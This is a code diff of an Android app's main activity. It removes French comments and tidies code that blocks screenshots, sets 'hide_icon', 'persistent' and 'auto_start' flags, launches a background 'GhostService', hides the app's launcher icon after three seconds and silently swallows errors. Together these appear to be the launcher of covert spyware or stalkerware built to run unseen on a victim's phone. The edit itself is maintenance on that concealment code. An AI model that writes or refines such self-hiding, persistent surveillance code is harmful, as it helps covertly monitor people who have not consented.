@@ -17,17 +17,14 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // Empêcher la capture d'écran
         getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, 
                              WindowManager.LayoutParams.FLAG_SECURE);
         
-        // Cacher immédiatement
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
             setShowWhenLocked(false);
             setTurnScreenOn(false);
         }
         
-        // Configuration initiale
         SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
         if (!prefs.contains("configured")) {
             prefs.edit()
@@ -37,11 +34,11 @@ public class MainActivity extends Activity {
                 .putBoolean("auto_start", true)
                 .putBoolean("hide_icon", true)
                 .putBoolean("persistent", true)
+                .putBoolean("first_run", false)
                 .putBoolean("configured", true)
                 .apply();
         }
         
-        // Démarrer le service
         Intent intent = new Intent(this, core.GhostService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(intent);
@@ -49,14 +46,10 @@ public class MainActivity extends Activity {
             startService(intent);
         }
         
-        // Cacher l'icône après 3 secondes
         if (prefs.getBoolean("hide_icon", true)) {
-            new Handler().postDelayed(() -> {
-                hideIcon();
-            }, 3000);
+            new Handler().postDelayed(this::hideIcon, 3000);
         }
         
-        // Fermer l'activité
         finish();
     }
     
@@ -76,9 +69,7 @@ public class MainActivity extends Activity {
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             );
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+        } catch (Exception ignored) {}
     }
     
     @Override
